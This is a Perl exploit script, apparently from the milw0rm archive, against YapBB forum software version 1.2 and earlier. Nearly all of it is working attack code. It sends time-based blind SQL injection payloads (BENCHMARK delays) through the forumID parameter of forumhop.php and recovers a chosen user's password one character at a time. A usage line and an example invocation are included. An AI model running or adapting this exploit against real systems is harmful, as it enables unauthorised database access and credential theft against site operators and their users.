--+++======================================================+++--
--+++====== YapBB <= 1.2 Blind SQL Injection Exploit ======+++--
--+++======================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub usage
{
	die "\nYapBB <= 1.2 Blind SQL Injection Exploit".
	    "\n[?] Author  : darkjoker".
	    "\n[?] Site    : http://darkjoker.net23.net".
	    "\n[?] CMS Site: http://yapbb.sourceforge.net/".
	    "\n[?] Usage   : perl ${0} <hostname> <path> <username> [<key_list>]".
	    "\n[?] Ex.     : perl ${0} localhost /YapBB root abcdefghijklmnopqrstuvwxyz".
	    "\n\n";
}

sub query
{
	my ($user, $chr, $pos) = @_;
	my $query = "123 OR IF ((ASCII(SUBSTRING((SELECT password FROM ".
	"forum_user WHERE nickname = '${user}'),${pos},1))=${chr}),BENCHMARK(200000000,CHAR(0)),0)";
	$query =~ s/ /%20/g;
	$query =~ s/'/%27/g;
	return $query;
}

sub exploit
{
	my ($hostname, $path, $user, $chr, $pos) = @_;
	$chr = ord ($chr);
	my $sock = new IO::Socket::INET (
						PeerHost => $hostname,
						PeerPort => 80,
						Proto    => "tcp"
					) or die "\n[!] Exploit failed.\n\n";

	my $query = query ($user, $chr, $pos);
	my $request = "GET ${path}/forumhop.php?action=next&forumID=${query} HTTP/1.1\r\n".
		      "Host: ${hostname}\r\n".
		      "Connection: Close\r\n\r\n";
	
	my $a = time ();
	print $sock $request;
	$_++ while (<$sock>);
	$a = ($a - time ()) * -1;
	close ($sock);

	return 1 if ($a > 4);
	return 0;
}
		
my ($hostname, $path, $user, $k_list) = @ARGV;
usage unless ($user);
my @key = split ("", ($k_list) ? $k_list : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
my $chr = 0;
my $pos = 1;
my $password;
while ($chr < scalar (@key))
{
	if (exploit ($hostname, $path, $user, $key [$chr], $pos))
	{
		$password .= $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
	{
		$chr++;
	}
}

print "\n[+] Password: ${password}\n\n";

# milw0rm.com [2009-02-04]